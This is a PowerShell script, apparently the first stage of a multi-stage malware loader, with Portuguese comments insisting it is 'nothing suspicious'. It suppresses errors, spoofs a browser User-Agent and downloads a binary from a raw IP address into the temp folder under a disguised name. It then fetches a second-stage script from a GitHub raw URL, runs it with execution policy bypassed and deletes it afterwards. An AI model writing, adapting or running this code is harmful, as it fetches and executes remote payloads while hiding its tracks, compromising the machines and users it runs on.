# =============================================================================
# STAGE 1 - DOWNLOAD
# =============================================================================
# Esta etapa apenas baixa o arquivo do servidor
# Nada suspeito: e um simples download
# =============================================================================

$ErrorActionPreference = "SilentlyContinue"

$dllUrl = "http://45.146.81.89:5055/download/latest"
$stage2Url = "https://raw.githubusercontent.com/luizesim99-alt/lumen/refs/heads/main/stage2_prepare.ps1"

$tempDll = "$env:TEMP\sysdata.tmp"
$tempStage2 = "$env:TEMP\s2.ps1"

try {
    $wc = New-Object Net.WebClient
    $wc.Headers.Add("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36")
    [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
    
    # Baixa DLL
    $data = $wc.DownloadData($dllUrl)
    if ($data.Length -eq 0) { exit 1 }
    [IO.File]::WriteAllBytes($tempDll, $data)
    
    # Baixa Stage 2
    $stage2Code = $wc.DownloadString($stage2Url)
    [IO.File]::WriteAllText($tempStage2, $stage2Code)
    
    # Executa Stage 2
    & powershell -NoP -ExecutionPolicy Bypass -File $tempStage2 -inputPath $tempDll
    
    # Cleanup
    Remove-Item $tempStage2 -Force -ErrorAction SilentlyContinue
    
} catch {
    exit 1
}
